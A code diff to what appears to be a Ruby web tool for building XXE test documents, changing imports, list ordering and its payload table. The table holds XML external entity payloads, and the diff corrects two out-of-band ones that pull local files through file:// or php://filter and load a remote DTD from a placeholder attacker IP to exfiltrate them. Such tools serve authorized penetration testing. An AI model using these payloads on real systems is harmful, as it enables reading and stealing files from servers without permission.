@@ -8,7 +8,7 @@ require 'optparse'
 require 'json'
 
 require './lib/util'
-require './model/master'
+require './lib/model'
 
 if not File.file?('./db/master.db')
     puts "|+| Database does not exist, initializing a blank one."
@@ -18,7 +18,6 @@ if not File.file?('./db/master.db')
 end
 
 # TODO apply to all xml in docx
-# TODO OOB is incorrect
 # TODO explain each menu item in help
 # TODO soft link content types
 
@@ -36,8 +35,8 @@ def read_payloads()
 	pl["Canary Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A parameter entity check. This is valuable because the entity is checked immediately when the DOCTYPE is parsed. No malicious application but useful to check for."]
 	pl["Plain External Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "FILE"> %a;]>', "A simple external parameter entity. Note, the file is the value for the payload; IP and PROTOCOL are ignored by OXML XXE. Useful because the entity is checked immediately when the DOCTYPE is parsed. "]
 	pl["Recursive Parameter Entity"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>',"Technically recursive parameter entities are not allowed by the XML spec. Should never work. Precursor to the billion laughs attack."]
-	pl["Out of Bounds Attack (using file://)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % dtd SYSTEM "IP">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the file:// protocol. See References."]
-	pl["Out of Bounds Attack (using php://filter)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=FILE"><!ENTITY % dtd SYSTEM "IP">%a;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the php filter \"convert.base64-encode\", which has been available since PHP 5.0.0. See References."]
+	pl["Out of Bounds Attack (using file://)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % dtd SYSTEM "IP">%dtd;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the file:// protocol. Details about building the dtd file at https://portswigger.net/web-security/xxe/blind."]
+	pl["Out of Bounds Attack (using php://filter)"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=FILE"><!ENTITY % dtd SYSTEM "IP">%dtd;]>',"OOB is a useful technique to exfiltrate files when attacking blind. This is accomplished by leveraging the php filter \"convert.base64-encode\", which has been available since PHP 5.0.0. See References."]
 	return pl
 end
 
@@ -232,7 +231,7 @@ post '/poc' do
 end
 
 get '/list' do
-	@files = Oxfile.all()
+	@files = Oxfile.all(:order => :id.desc)
 
 	haml :list
 end
